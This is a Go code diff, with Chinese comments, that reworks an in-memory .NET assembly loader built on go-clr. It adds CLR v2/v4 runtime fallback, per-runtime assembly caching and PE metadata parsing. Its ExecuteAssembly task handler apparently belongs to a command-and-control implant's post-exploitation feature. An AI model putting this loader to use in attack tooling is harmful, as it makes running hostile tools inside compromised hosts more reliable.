@@ -29,10 +29,14 @@ var (
 type assembly struct {
 	methodInfo *clr.MethodInfo
 	hash       [32]byte
+	// runtime 记录程序集加载进哪个 CLR 家族（"v2"/"v4"）。
+	// MethodInfo 只在其所属 AppDomain 有效，跨运行时回退时不能复用缓存。
+	runtime string
 }
 
 type CLRInstance struct {
 	runtimeHost *clr.ICORRuntimeHost
+	runtime     string // 已加载的 CLR 家族：v2 / v4
 	sync.Mutex
 }
 
@@ -41,27 +45,51 @@ func init() {
 	assemblies = make([]*assembly, 0)
 }
 
-func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) *clr.ICORRuntimeHost {
+// GetRuntimeHost 取指定 CLR 家族（"v2"/"v4"）的运行时宿主。
+//
+// 原实现把第一次 LoadCLR 的宿主永久缓存且忽略后续 runtime 参数，
+// 导致 ExecuteAssembly 的"换一个 CLR 版本重试"永远命中同一个宿主——
+// 版本回退是死代码。现在按运行时区分：请求的家族不同才重新 LoadCLR，
+// 失败时把错误带回给调用方（原实现丢弃 LoadCLR 的 error，只剩一句
+// "Could not load CLR runtime host"）。
+func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) (*clr.ICORRuntimeHost, error) {
 	c.Lock()
 	defer c.Unlock()
-	if c.runtimeHost == nil {
+	if runtime == "" {
+		runtime = "v4"
+	}
+	if c.runtimeHost != nil && c.runtime == runtime {
+		return c.runtimeHost, nil
+	}
+	if debug {
+		log.Printf("Initializing CLR runtime %s", runtime)
+	}
+	host, err := clr.LoadCLR(runtime)
+	if err != nil {
+		return nil, fmt.Errorf("load CLR %s: %w", runtime, err)
+	}
+	if host == nil {
+		// go-clr 在目标运行时未安装时会静默选中最后一个已安装运行时，
+		// 这里把空宿主当成错误，交给上层换版本重试。
+		return nil, fmt.Errorf("load CLR %s: empty runtime host (runtime not installed?)", runtime)
+	}
+	// CLR 在启动时捕获当时的 STD 句柄，且此后不会跟随 RestoreStdoutStderr 回退。
+	// 因此每加载一个**新的**运行时宿主（v4 失败后回退 v2），都必须先重定向：
+	// 此时上一次 LoadBin 已 Restore，origSTDOUT 又是进程原始句柄，重复调用安全。
+	// 复用同一宿主时不要重定向——它的捕获管道仍然有效，重定向只会多泄漏一组管道。
+	if err := clr.RedirectStdoutStderr(); err != nil {
 		if debug {
-			log.Printf("Initializing CLR runtime host")
-		}
-		c.runtimeHost, _ = clr.LoadCLR(runtime)
-		err := clr.RedirectStdoutStderr()
-		if err != nil {
-			if debug {
-				log.Printf("could not redirect stdout/stderr: %v\n", err)
-			}
+			log.Printf("could not redirect stdout/stderr: %v\n", err)
 		}
 	}
-	return c.runtimeHost
+	c.runtimeHost = host
+	c.runtime = runtime
+	return host, nil
 }
 
-func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
+func addAssembly(methodInfo *clr.MethodInfo, data []byte, runtime string) {
 	asmHash := sha256.Sum256(data)
-	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
+	asm := &assembly{methodInfo: methodInfo, hash: asmHash, runtime: runtime}
 	// 【优化】缓存上限：超过 32 个程序集时丢弃最旧的，防止内存无限增长
 	if len(assemblies) >= 32 {
 		assemblies = append([]*assembly(nil), assemblies[1:]...)
@@ -69,96 +97,151 @@ func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
 	assemblies = append(assemblies, asm)
 }
 
-func getAssembly(data []byte) *assembly {
+func getAssembly(data []byte, runtime string) *assembly {
 	asmHash := sha256.Sum256(data)
 	for _, asm := range assemblies {
-		if asm.hash == asmHash {
+		if asm.hash == asmHash && asm.runtime == runtime {
 			return asm
 		}
 	}
 	return nil
 }
 
-// detectDotNetVersion 尝试从 PE 文件中检测 .NET 目标版本
-func detectDotNetVersion(data []byte) string {
-	if len(data) < 1024 {
-		return "unknown"
-	}
+// ===== PE / CLR 元数据解析 =====
+//
+// 原实现把 PE 前 512KB 当字符串扫 "v4.5"/"v4.8" 等子串，问题有两个：
+//   1. 先查 "v4.0.30319"，而所有 .NET 4.x 程序集的元数据版本都是它，
+//      后面 v4.5~v4.8 的分支永远走不到；
+//   2. 这些"版本"对 go-clr 没有意义——CLR 只有 v2 与 v4 两个家族
+//      （v4.5/4.6/4.7/4.8 都跑在 v4.0.30319 上），传 "v4.5" 给
+//      clr.LoadCLR 只会匹配不到而静默落到"最后一个运行时"。
+// 这里按 ECMA-335 读取 CLI 头 → 元数据根里的真实版本串，只归一到 v2/v4。
 
-	// 检查 PE 头
-	if data[0] != 0x4D || data[1] != 0x5A {
-		return "unknown"
+// peRvaToOffset 把 RVA 映射到文件偏移（遍历节表）。
+func peRvaToOffset(data []byte, peOff, numSections, optOff, optSize int, rva uint32) (int, bool) {
+	secOff := optOff + optSize
+	for i := 0; i < numSections; i++ {
+		s := secOff + i*40
+		if s+40 > len(data) {
+			return 0, false
+		}
+		virtualSize := binary.LittleEndian.Uint32(data[s+8 : s+12])
+		virtualAddr := binary.LittleEndian.Uint32(data[s+12 : s+16])
+		rawSize := binary.LittleEndian.Uint32(data[s+16 : s+20])
+		rawPtr := binary.LittleEndian.Uint32(data[s+20 : s+24])
+		span := virtualSize
+		if rawSize > span {
+			span = rawSize
+		}
+		if rva >= virtualAddr && rva < virtualAddr+span {
+			off := int(rawPtr + (rva - virtualAddr))
+			if off < 0 || off >= len(data) {
+				return 0, false
+			}
+			return off, true
+		}
 	}
-
-	// 获取 PE 头偏移
-	peHeaderOffset := binary.LittleEndian.Uint32(data[60:64])
-	if uint32(len(data)) < peHeaderOffset+256 {
-		return "unknown"
-	}
-
-	// 检查 PE 签名
-	if bytes.Compare(data[peHeaderOffset:peHeaderOffset+4], []byte{'P', 'E', 0, 0}) != 0 {
-		return "unknown"
-	}
-
-	// 获取 Optional Header 中的 CLR Runtime Header
-	// 这个简化的检测方法可以帮助我们做初步判断
-
-	// 【优化】CLR 版本字符串位于 PE 元数据附近，只扫描前 512KB，
-	// 避免对大程序集做多次全量 strings.Contains（CPU 浪费）
-	scanLen := len(data)
-	if scanLen > 512*1024 {
-		scanLen = 512 * 1024
-	}
-	content := string(data[:scanLen])
-	if strings.Contains(content, "v4.0.30319") {
-		return "v4.0"
-	}
-	if strings.Contains(content, "v4.5") {
-		return "v4.5"
-	}
-	if strings.Contains(content, "v4.6") {
-		return "v4.6"
-	}
-	if strings.Contains(content, "v4.7") {
-		return "v4.7"
-	}
-	if strings.Contains(content, "v4.8") {
-		return "v4.8"
-	}
-	if strings.Contains(content, "v2.0.50727") {
-		return "v2.0"
-	}
-
-	// 如果找不到特定版本，检查是否包含 .NET 4.x 相关内容
-	if strings.Contains(content, "mscorlib") && strings.Contains(content, "System") {
-		// 可能是 .NET 4.x，默认为 4.0
-		return "v4.0"
-	}
-
-	return "unknown"
+	return 0, false
 }
 
-// getOptimalCLRVersions 根据检测到的版本返回优化的 CLR 版本尝试顺序
-func getOptimalCLRVersions(detectedVersion string) []string {
-	switch detectedVersion {
-	case "v4.0":
-		// 对于 v4.0 编译的程序集，优先尝试低版本 CLR
-		return []string{"v4.0", "v4.5", "v4.6", "v4.7", "v4.8"}
-	case "v4.5":
-		return []string{"v4.5", "v4.6", "v4.7", "v4.8", "v4.0"}
-	case "v4.6":
-		return []string{"v4.6", "v4.7", "v4.8", "v4.5", "v4.0"}
-	case "v4.7":
-		return []string{"v4.7", "v4.8", "v4.6", "v4.5", "v4.0"}
-	case "v4.8":
-		return []string{"v4.8", "v4.7", "v4.6", "v4.5", "v4.0"}
-	case "v2.0":
-		return []string{"v2.0", "v4.0", "v4.5", "v4.6", "v4.7", "v4.8"}
-	default:
-		// 未知版本，使用保守的顺序，从较新版本开始
-		return []string{"v4.0", "v4.5", "v4.6", "v4.7", "v4.8", "v2.0"}
+// detectAssemblyRuntime 读取程序集元数据的 CLR 版本串，返回 (家族, 原始版本)。
+// 家族为 "v2"/"v4"；非托管 PE 或解析失败时两者都为空。
+func detectAssemblyRuntime(data []byte) (family, version string) {
+	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
+		return "", ""
 	}
+	peOff := int(binary.LittleEndian.Uint32(data[60:64]))
+	if peOff < 0 || peOff+24 > len(data) {
+		return "", ""
+	}
+	if !bytes.Equal(data[peOff:peOff+4], []byte{'P', 'E', 0, 0}) {
+		return "", ""
+	}
+	numSections := int(binary.LittleEndian.Uint16(data[peOff+6 : peOff+8]))
+	optSize := int(binary.LittleEndian.Uint16(data[peOff+20 : peOff+22]))
+	optOff := peOff + 24
+	if optSize < 2 || optOff+optSize > len(data) {
+		return "", ""
+	}
+	// DataDirectory 在 Optional Header 里的偏移：PE32=96，PE32+=112；CLI 是第 14 项。
+	var dataDirOff int
+	switch binary.LittleEndian.Uint16(data[optOff : optOff+2]) {
+	case 0x10b: // PE32
+		dataDirOff = optOff + 96
+	case 0x20b: // PE32+
+		dataDirOff = optOff + 112
+	default:
+		return "", ""
+	}
+	cliDir := dataDirOff + 14*8
+	if cliDir+8 > len(data) {
+		return "", ""
+	}
+	cliRVA := binary.LittleEndian.Uint32(data[cliDir : cliDir+4])
+	cliSize := binary.LittleEndian.Uint32(data[cliDir+4 : cliDir+8])
+	if cliRVA == 0 || cliSize < 16 { // 没有 CLI 头：普通原生 PE
+		return "", ""
+	}
+	cliOff, ok := peRvaToOffset(data, peOff, numSections, optOff, optSize, cliRVA)
+	if !ok || cliOff+16 > len(data) {
+		return "", ""
+	}
+	metaRVA := binary.LittleEndian.Uint32(data[cliOff+8 : cliOff+12])
+	if metaRVA == 0 {
+		return "", ""
+	}
+	metaOff, ok := peRvaToOffset(data, peOff, numSections, optOff, optSize, metaRVA)
+	if !ok || metaOff+20 > len(data) {
+		return "", ""
+	}
+	// 元数据根签名 "BSJB"
+	if binary.LittleEndian.Uint32(data[metaOff:metaOff+4]) != 0x424A5342 {
+		return "", ""
+	}
+	verLen := int(binary.LittleEndian.Uint32(data[metaOff+12 : metaOff+16]))
+	if verLen <= 0 || verLen > 256 || metaOff+16+verLen > len(data) {
+		return "", ""
+	}
+	version = strings.TrimRight(string(data[metaOff+16:metaOff+16+verLen]), "\x00")
+	switch {
+	case strings.HasPrefix(version, "v2."):
+		family = "v2"
+	case strings.HasPrefix(version, "v4."):
+		family = "v4"
+	}
+	return family, version
+}
+
+// installedCLRFamilies 枚举本机可加载的 CLR 家族（v2/v4）。
+// 取不到时返回 nil，调用方按"全都试一遍"处理。
+func installedCLRFamilies() map[string]bool {
+	metahost, err := clr.CLRCreateInstance(clr.CLSID_CLRMetaHost, clr.IID_ICLRMetaHost)
+	if err != nil || metahost == nil {
+		return nil
+	}
+	runtimes, err := clr.GetInstalledRuntimes(metahost)
+	if err != nil {
+		return nil
+	}
+	families := make(map[string]bool, 2)
+	for _, r := range runtimes {
+		switch {
+		case strings.HasPrefix(r, "v2."):
+			families["v2"] = true
+		case strings.HasPrefix(r, "v4."):
+			families["v4"] = true
+		}
+	}
+	return families
+}
+
+// clrVersionOrder 按程序集目标运行时给出 CLR 家族尝试顺序。
+// 只有 v2/v4 是真实存在的运行时；同一家族内的 4.x 版本没有独立运行时。
+func clrVersionOrder(family string) []string {
+	if family == "v2" {
+		return []string{"v2", "v4"}
+	}
+	return []string{"v4", "v2"}
 }
 
 func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (string, error) {
@@ -187,16 +270,17 @@ func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (st
 		return "", errors.New("Invalid assembly data: not a valid PE file")
 	}
 
-	rtHost := clrInstance.GetRuntimeHost(runtime, debug)
-	if rtHost == nil {
+	rtHost, hostErr := clrInstance.GetRuntimeHost(runtime, debug)
+	if hostErr != nil {
+		// 运行时刚加载时偶发失败：重试一次再交给上层换版本。
 		time.Sleep(time.Second)
-		rtHost = clrInstance.GetRuntimeHost(runtime, debug)
-		if rtHost == nil {
-			return "", errors.New("Could not load CLR runtime host")
+		rtHost, hostErr = clrInstance.GetRuntimeHost(runtime, debug)
+		if hostErr != nil {
+			return "", fmt.Errorf("could not load CLR %s: %w", runtime, hostErr)
 		}
 	}
 
-	if asm := getAssembly(data); asm != nil {
+	if asm := getAssembly(data, runtime); asm != nil {
 		methodInfo = asm.methodInfo
 		if debug {
 			log.Printf("Using cached assembly")
@@ -219,7 +303,7 @@ func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (st
 			errorMsg += "4. Assembly corruption\n"
 			return errorMsg, err
 		}
-		addAssembly(methodInfo, data)
+		addAssembly(methodInfo, data, runtime)
 		if debug {
 			log.Printf("Assembly loaded successfully")
 		}
@@ -314,12 +398,33 @@ func ExecuteAssembly(sh []byte, arguments string, execTaskID uint32) ([]byte, er
 		debug := true
 		params := strings.Split(arguments, " ")
 
-		// 尝试检测程序集的目标.NET版本
-		detectedVersion := detectDotNetVersion(sh)
-		communication.ExecOutput([]byte(fmt.Sprintf("[*] Detected target .NET version: %s", detectedVersion)))
+		// 读元数据确定程序集目标运行时（v2/v4），据此决定回退顺序。
+		detectedFamily, detectedVersion := detectAssemblyRuntime(sh)
+		if detectedVersion == "" {
+			communication.ExecOutput([]byte("[*] CLR metadata not found, assuming v4"))
+		} else {
+			communication.ExecOutput([]byte(fmt.Sprintf("[*] Assembly CLR: %s (family %s)", detectedVersion, detectedFamily)))
+		}
 
-		// 根据检测到的版本调整CLR版本尝试顺序
-		clrVersions := getOptimalCLRVersions(detectedVersion)
+		// 已安装家族过滤：未安装的运行时不必浪费一次加载尝试
+		// （go-clr 在目标缺失时会静默落到最后一个已安装运行时）。
+		clrVersions := clrVersionOrder(detectedFamily)
+		if installed := installedCLRFamilies(); len(installed) > 0 {
+			names := make([]string, 0, len(installed))
+			for name := range installed {
+				names = append(names, name)
+			}
+			communication.ExecOutput([]byte(fmt.Sprintf("[*] Installed CLR: %v", names)))
+			filtered := make([]string, 0, len(clrVersions))
+			for _, v := range clrVersions {
+				if installed[v] {
+					filtered = append(filtered, v)
+				}
+			}
+			if len(filtered) > 0 {
+				clrVersions = filtered
+			}
+		}
 		communication.ExecOutput([]byte(fmt.Sprintf("[*] CLR version order: %v", clrVersions)))
 
 		var lastError error
